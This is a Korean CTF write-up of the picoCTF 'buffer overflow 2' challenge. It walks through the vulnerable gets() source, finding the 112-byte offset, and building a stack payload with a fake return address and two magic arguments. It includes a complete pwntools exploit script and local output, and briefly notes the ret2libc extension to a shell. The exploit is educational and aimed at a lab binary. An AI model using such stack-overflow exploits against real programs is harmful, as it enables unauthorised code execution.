---
title: 'CTF — picoCTF: buffer overflow 2'
date: 2026-06-29 00:00:00 +0900
categories:
- CTF
tags:
- ctf
- pwn
- picoCTF
- 32bit
- ret2win-with-args
author: mmamm4
---

# CTF — picoCTF: buffer overflow 2

`win()`을 호출해 `flag.txt`를 출력시키는 ret2win 문제입니다. `win()`이 인자 두 개를 받아 각각 `0xCAFEF00D`, `0xF00DF00D`인지 검사하므로, return address를 덮는 것에 더해 두 인자를 스택에 배치해야 합니다. 32비트 ELF이며 소스(`vuln.c`)가 제공됩니다. 본 기록은 로컬 환경에서의 익스플로잇 검증까지를 다룹니다.

## buffer overflow 1과의 차이

이전 문제는 `[패딩][win 주소]`만으로 풀렸습니다. `win()`에 제어를 넘기는 것으로 충분했습니다. 이번에는 `win()`이 자기 인자를 검사하고, 32비트에서는 인자가 레지스터가 아니라 스택으로 전달됩니다. 따라서 `win()` 주소 뒤에 인자 두 개를 배치해야 하며, 그 사이에 한 칸이 더 필요합니다(페이로드 항목에서 설명).

## 바이너리와 소스

```
Arch:    i386-32-little
RELRO:   Partial RELRO
Stack:   No canary found
NX:      NX enabled
PIE:     No PIE (0x8048000)
```

보호기법은 buffer overflow 1과 동일합니다. canary가 없어 버퍼부터 return address까지 그대로 덮을 수 있고, PIE가 없어 `win()` 주소가 매 실행 고정입니다. NX는 활성화돼 있으나, 스택에 셸코드를 올리지 않고 기존 `win()`으로 분기하므로 영향이 없습니다.

```c
#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) { /* ... */ exit(0); }
  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);        // 길이 제한 없음 → 오버플로우
  puts(buf);
}
```

취약점은 `vuln()`의 `gets()`입니다. 매직 값은 소스에 그대로 노출돼 있습니다 — `arg1`은 `0xCAFEF00D`, `arg2`는 `0xF00DF00D`입니다.

## 오프셋

`buf[100]` 선언만 보고 오프셋을 100으로 잡으면 어긋납니다. 컴파일러의 정렬 패딩과 saved EBP가 버퍼와 return address 사이에 존재하기 때문입니다. cyclic으로 측정했습니다.

```
pwndbg> cyclic 200
pwndbg> r
...
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()

pwndbg> cyclic -l 0x62616164
Found at offset 112
```

EIP가 `0x62616164`(`daab`)로 덮였고, 이를 역산한 오프셋은 112였습니다.

## 페이로드 — 가짜 return address

```
낮은 주소 →                                              → 높은 주소
[ 패딩 112 ][ win 주소 ][ 가짜 ret ][   arg1   ][   arg2   ]
                          [esp]      [esp+4]    [esp+8]
```

`vuln()`의 `ret`가 스택에서 `win` 주소를 꺼내 EIP에 넣는 시점에 ESP는 그 바로 다음 칸을 가리킵니다. `win()`은 이 칸을 자기 return address 자리(`[esp]`)로, 이어지는 두 칸(`[esp+4]`, `[esp+8]`)을 인자로 읽습니다.

따라서 `win` 주소 뒤에 4바이트 한 칸을 채워야 합니다. 이 칸을 생략하면 `arg1`이 return address 자리로 당겨져 인자가 한 칸씩 어긋납니다. 셸을 실행하는 문제가 아니므로 값 자체는 무의미하며, `0x42424242` 같은 더미로 자리만 확보하면 됩니다.

## 익스플로잇

`win` 주소는 심볼에 남아 있고 PIE도 없으니 `elf.symbols['win']`로 바로 뽑으면 됩니다.

```python
#!/usr/bin/env python3
from pwn import *

BINARY = './vuln'
elf = context.binary = ELF(BINARY)

offset   = 112
win_addr = elf.symbols['win']
arg1     = 0xCAFEF00D
arg2     = 0xF00DF00D

payload  = b'A' * offset
payload += p32(win_addr)
payload += p32(0x42424242)     # 가짜 ret — 자리 채우기용
payload += p32(arg1)
payload += p32(arg2)

io = process(BINARY)           # flag.txt 를 같은 폴더에 두고 실행
io.sendlineafter(b'string: \n', payload)
print(io.recvall().decode(errors='ignore'))
```

리틀엔디언 변환은 `p32()`가 처리합니다. `sendlineafter(b'string: \n', ...)`는 `main`의 `puts("Please enter your string: ")` 출력을 기다렸다가 페이로드를 전송합니다. `puts`가 끝에 개행을 붙이므로 구분자를 `string: \n`으로 지정한 것입니다.

같은 디렉터리에 테스트용 `flag.txt`를 두고 실행한 결과입니다.

```
[+] Starting local process './vuln': pid 6662
[+] Receiving all data: Done (147B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV)
AAAA...AAAA\x04\x08BBBB
picoCTF{...}
```

플래그가 출력됐습니다. 이후의 SIGSEGV는 `win()`이 가짜 return address(`0x42424242`)로 복귀하며 발생하며, 플래그는 그 이전에 출력되므로 결과에 영향이 없습니다.

## 정리

이번 문제는 32비트에서 함수에 인자를 전달하는 스택 구조를 직접 구성하는 연습이었습니다. `ret`로 함수에 진입할 때의 스택 프레임(`[esp]`=복귀 주소, `[esp+4]` 이후 인자)을 기준으로 보면 가짜 return address 한 칸이 필요한 이유가 정리됩니다.

이 구조는 ret2libc로 확장됩니다. `win` 자리에 `system`, 인자 자리에 `/bin/sh` 문자열 주소를 배치하면 동일한 형태로 셸을 획득할 수 있습니다. 가짜 return address 자리에는 `system` 종료 후 복귀할 주소(일반적으로 `exit`)를 둡니다.
